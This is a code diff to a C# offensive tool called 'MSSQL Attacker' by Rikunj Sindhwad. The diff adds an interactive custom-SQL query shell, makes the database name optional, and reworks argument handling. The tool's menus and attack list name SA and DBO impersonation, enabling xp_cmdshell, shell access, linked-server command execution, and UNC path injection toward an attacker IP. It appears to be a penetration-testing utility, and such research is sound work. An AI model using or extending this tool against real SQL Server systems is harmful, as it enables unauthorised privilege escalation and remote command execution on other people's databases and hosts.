@@ -54,7 +54,7 @@ namespace MSSQLAttacker
         }
 
 
-        static SqlConnection connectDb(string server, string database, [Optional, DefaultParameterValue(null)] String username, [Optional, DefaultParameterValue(null)] String password)
+        static SqlConnection connectDb(string server, [Optional, DefaultParameterValue("master")] string database, [Optional, DefaultParameterValue(null)] String username, [Optional, DefaultParameterValue(null)] String password)
         {
             String conString;
             if(string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password)) 
@@ -104,6 +104,49 @@ namespace MSSQLAttacker
             String databaseName = getFilteredResult(getQueryResult(con, query));
             if (!string.IsNullOrEmpty(databaseName)) { doWrite(1,"Found Trustworthy Database") ; return databaseName; }
             return "";
+
+        }
+
+        static void runCustomQuery(SqlConnection con, [Optional, DefaultParameterValue(null)] String queryIn)
+        {
+
+            if (string.IsNullOrEmpty(queryIn))
+            {
+                while (true)
+                {
+                    try
+                    {
+                        Console.Write("Query> ");
+                        String query = Console.ReadLine().ToString();
+                        if (query == "exit") { doWrite(0, "Exiting!"); break; }
+                        String execQuery = String.Format("{0};", query);
+                        String output = getFilteredResult(getQueryResult(con, execQuery));
+                        doWrite(2, output);
+                    }
+                    catch (Exception)
+                    {
+                        doWrite(0, "Query Execution Failed");
+                        return;
+
+                    }
+                }
+
+            }
+            try
+            {
+                String query = String.Format("{0};", queryIn);
+                Console.WriteLine(query);
+                String queryout = getFilteredResult(getQueryResult(con, query));
+                doWrite(2, queryout);
+                return;
+
+            }
+            catch (Exception)
+            {
+
+                doWrite(0, "Missing Privileges || Ex.Sysadmin");
+            }
+
 
         }
         static void abuseImpersonationDBO(SqlConnection con, [Optional, DefaultParameterValue(null)] String databaseName)
@@ -351,7 +394,7 @@ namespace MSSQLAttacker
                 Console.Title = "MSSQL Attacker";
                 Console.WriteLine("\t\t\t\t[*] MSSQL Attacker V1 by Rikunj Sindhwad [*]\n");
                 Console.WriteLine("[1] Get Information\t\t\t [2] UNC PATH Injection\t\t [3] Impersonation Check\n[4] ImpersonateSA\t\t\t [5] Impersonate DBO\t\t [6] Enable xp_cmdshell\n[7] Shell_Access\t\t\t [8] Check LinkedServers\t [9] Enumerate LinkedServer Version");
-                Console.WriteLine("[10] EnableLinkedServer_xp_cmdshell\t [11] LinkedServer xp_cmdshell");
+                Console.WriteLine("[10] EnableLinkedServer_xp_cmdshell\t [11] LinkedServer xp_cmdshell\t[12] Custom SQL Query");
                 Console.WriteLine("[0] Exit Program\n");
                 Console.Write("[INPUT] Enter Value: ");
             }
@@ -361,8 +404,20 @@ namespace MSSQLAttacker
         {
             bool exit = false;
             SqlConnection con;
-            if (args.Length == 5) { con = connectDb(args[1], args[2], args[3], args[4]); }
-            else { con = connectDb(args[1], args[2]); }
+            switch (args.Length)
+            {
+                
+                case 3:
+                    con = connectDb(args[1], args[2]);
+                    break;
+                case 5:
+                    con = connectDb(args[1], args[2], args[3], args[4]);
+                    break;
+                default:
+                    con = connectDb(args[1]);
+                    break;
+            }
+
             while (!exit)
             {
 
@@ -393,6 +448,7 @@ namespace MSSQLAttacker
                     case 9: enumLinkedServerVersion(con); break;
                     case 10: enableLinkedCmdShell(con); break;
                     case 11: linkedServerCmdExec(con); break;
+                    case 12: runCustomQuery(con); break;
 
                     default:
                         doWrite(0, "Invelid Key: Exiting..");
@@ -410,7 +466,7 @@ namespace MSSQLAttacker
             Console.WriteLine("[*] MSSQL Attacker - V1 by Rikunj Sindhwad [GUI MODE] [*]");
             Console.ResetColor();
             doWrite(2, "\t\tHELP MENU",0);
-            doWrite(2, " USAGE: binary.exe GUI DatabaseServer DatabaseName [Optional] Username [Optional] Password", 0);
+            doWrite(2, " USAGE: binary.exe GUI DatabaseServer [Optional] DatabaseName [Optional] Username [Optional] Password", 0);
             doWrite(2, " USAGE: binary.exe GUI dc01.corp1.com masters SA SecretPassword", 0);
 
         }
@@ -424,7 +480,7 @@ namespace MSSQLAttacker
             doWrite(2, " USAGE: binary.exe cli -a AttackName -t DatabaseServer -d DatabaseName\n", 0);
             doWrite(2, " -a\t\t\tAttack Mode [Add -a to get list of attacks]", 0);
             doWrite(2, " -t\t\t\tTarget Server", 0);
-            doWrite(2, " -d\t\t\tTarget DatabaseName", 0);
+            doWrite(2, " -d\t\t\tTarget DatabaseName [Optional]", 0);
             doWrite(2, " -u\t\t\tTarget Username [Optional]", 0);
             doWrite(2, " -p\t\t\tTarget Password [Optional]", 0);
             doWrite(2, " -dbo\t\t\tDatabaseNmae for DBO impersonation [Optional]", 0);
@@ -462,11 +518,9 @@ namespace MSSQLAttacker
         }
         static bool checkSubargs(string[]args, String arg)
         {
-            string[] attacks = { "checkimpersonate", "checklinkedservers", "checklinkedserverVersion", "uncpathinject", "getinfo", "enablecmdshell", "enablelinkedcmdshell" , "execlinkedcmd","execcmd" };
+            string[] attacks = { "checkimpersonate", "checklinkedservers", "checklinkedserverVersion", "uncpathinject", "getinfo", "enablecmdshell", "enablelinkedcmdshell" , "execlinkedcmd","execcmd", "runCustomQuery" };
             if (!Array.Exists(attacks, element => element == arg)) { printAttacks(attacks); return false; }
             if (!checkArgs(args, "-t")) { doWrite(0,"Missing -t [TARGETSERVER]", 0); return false; }
-            if (!checkArgs(args, "-d")) { doWrite(0, "Missing -d [DATABASENAME]",0 ); return false; }
-
             if (arg.Contains("linked") && !arg.Contains("checklinkedservers"))
             {
                 if (!checkArgs(args, "-ls")) { doWrite(0, "Missing -ls [LinkedServer]",0); return false; }
@@ -477,6 +531,11 @@ namespace MSSQLAttacker
                 if (!checkArgs(args, "-c")) { doWrite(0, "Missing -c [Command to execute]", 0); return false; }
                 
             }
+            if (arg.Contains("Custom"))
+            {
+                if (!checkArgs(args, "-query")) { doWrite(0, "Missing -query \"Custom SQL Query\"", 0); return false; }
+
+            }
             if (arg.Contains("uncpathinject"))
             {
                 if (!checkArgs(args, "-l")) { doWrite(0, "Missing -l [ LHOST || Attacker IP ]", 0); return false; }
@@ -486,24 +545,29 @@ namespace MSSQLAttacker
         }
         static void attackCLI(string[] args)
         {
-            String dbserver, dbname,lhost, attack;
+            String dbserver, lhost, attack;
             String linkedServer = "";
-            
             String command = "";
+            String dbname = "";
             String dboname = "";
+            String customQuery = "";
             SqlConnection con;
 
             if(args.Length < 2) { printCliHelp(); return; }
-            string[] attacks = { "checkimpersonate", "checklinkedservers", "checklinkedserverVersion", "uncpathinject", "getinfo", "enablecmdshell", "enablelinkedcmdshell", "execlinkedcmd", "execcmd" };
+            string[] attacks = { "checkimpersonate", "checklinkedservers", "checklinkedserverVersion", "uncpathinject", "getinfo", "enablecmdshell", "enablelinkedcmdshell", "execlinkedcmd", "execcmd", "runCustomQuery" };
             if (!checkArgs(args, "-a")) { printAttacks(attacks); return; }
+            if (checkArgs(args, "-d")) { dbname = args[Array.IndexOf(args, "-d") + 1];}
             attack = args[Array.IndexOf(args, "-a") + 1];
             if(!checkSubargs(args, attack)) { return; }
 
             dbserver = args[Array.IndexOf(args, "-t") + 1];
-            dbname = args[Array.IndexOf(args, "-d") + 1];
+            
             linkedServer = args[Array.IndexOf(args, "-ls") + 1];
             command = args[Array.IndexOf(args, "-c") + 1];
-            if(checkArgs(args, "-dbo")) { dboname = args[Array.IndexOf(args, "-dbo") + 1]; }
+            customQuery = args[Array.IndexOf(args, "-query") + 1];
+            //Console.WriteLine(customQuery);
+
+            if (checkArgs(args, "-dbo")) { dboname = args[Array.IndexOf(args, "-dbo") + 1]; }
             lhost = args[Array.IndexOf(args, "-l") + 1];
             // Try connecting to the specified server
             try {
@@ -513,7 +577,12 @@ namespace MSSQLAttacker
                     String password = args[Array.IndexOf(args, "-p") + 1];
                     con = connectDb(dbserver, dbname, username, password);
                 }
-                else { con = connectDb(dbserver, dbname); }
+                if (checkArgs(args, "-d"))
+                {
+
+                    con = connectDb(dbserver, dbname);
+                }
+                else { con = connectDb(dbserver); }
                  }
             catch (Exception) { return; }
             //Impersonation
@@ -522,7 +591,7 @@ namespace MSSQLAttacker
 
 
             //Main Attack
-            switch (attack)
+            switch (attack.ToLower())
             {
 
                 case "getinfo":
@@ -535,7 +604,7 @@ namespace MSSQLAttacker
                 case "checklinkedservers":
                     enumLinkedServer(con);
                     break;
-                case "checklinkedserverVersion":
+                case "checklinkedserverversion":
                     enumLinkedServerVersion(con, linkedServer);
                     break;
                 case "uncpathinject":
@@ -555,7 +624,11 @@ namespace MSSQLAttacker
                 case "execlinkedcmd":
                     linkedServerCmdExec(con, linkedServer, command);
                     break;
+                case "runcustomquery":
+                    runCustomQuery(con, customQuery);
+                    break;
                 default:
+                    doWrite(0, "Wrong Attack?");
                     printCliHelp();
                     break;
             }
@@ -565,17 +638,23 @@ namespace MSSQLAttacker
 
         static void Main(string[] args)
         {
+            if(args.Length == 0) 
+            {
+                printCliHelp();
+                printGUIHelp();
+                return;
+            }
             try
             {
-                if (args[0].ToLower() == "gui") { attackGUI(args); }
+                if (args[0].ToLower() == "gui") {attackGUI(args); }
                 if (args[0].ToLower() == "cli") {attackCLI(args);}
 
             }
             catch (Exception)
             {
+                doWrite(0, "Something Wrong!", 0);
+                throw;
 
-                printGUIHelp();
-                printCliHelp();
             }
 
 
